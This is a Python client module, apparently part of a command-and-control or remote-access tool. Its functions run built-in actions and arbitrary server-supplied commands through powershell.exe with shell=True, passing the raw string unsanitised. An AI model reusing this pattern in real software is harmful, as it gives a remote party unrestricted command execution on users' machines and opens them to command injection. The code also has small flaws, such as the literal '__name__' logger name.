"""These are the command line functions that can be executed by the client."""
import logging
import subprocess

from tools.constants import Actions, OS

# TODO tie this logger to the main logging module for the client, was getting
# a circular import error
logger = logging.getLogger('__name__')


def stock_command(input_cmd: Actions) -> bytes:
    """This function performs "stock" commands that are built into the client.
    Custom commands are performed by the `custom_command()` function below.

    Args:
        cmd (Actions): The action to perform.

    Returns:
        bytes: The output from the command.
    """
    cmd = input_cmd.name.lower()

    # Handle platform-specific commands, if needed.
    if cmd in ['ipconfig']:
        print(f'About to handle stock OS-specific command; OS is {OS}')
        # The functions handled here have different values on Windows and
        # Linux (not like `whoami` which is the same on both).  A `pass`
        # statement simply means there's no reason to change the current value.
        if OS == 'Windows':
            match cmd:
                case _:
                    pass
        elif OS == 'Linux':
            match cmd:
                case 'ipconfig':
                    cmd = 'ip a'
                case _:
                    pass
        else:
            raise NotImplementedError('Only handling Windows or Linux commands'
                                      ' presently!')

    # Execute the command on the "command line", of sorts.
    print('Execute stock command...')

    # Use PowerShell to support the commands and syntax that will be executed.
    output = subprocess.run('powershell.exe ' + cmd,
                            check=True, capture_output=True, shell=True).stdout

    return output


def custom_command(cmd: str) -> bytes:
    """This function performs custom commands as specified by the server.

    Args:
        cmd (str): The action to perform.

    Returns:
        bytes: The output from the command.
    """
    # Logic is the same as above.
    print(f'Execute custom command:  {cmd}')

    try:
        # If the process runs correctly, return the stdout of the
        # CompletedProcess object.
        cp = subprocess.run('powershell.exe ' + cmd,
                            check=True, capture_output=True, shell=True)
        output = cp.stdout

    except subprocess.CalledProcessError as e:
        # If an error is returned by the shell, need to return the error text.
        output = str(e.stderr).encode()

    return output
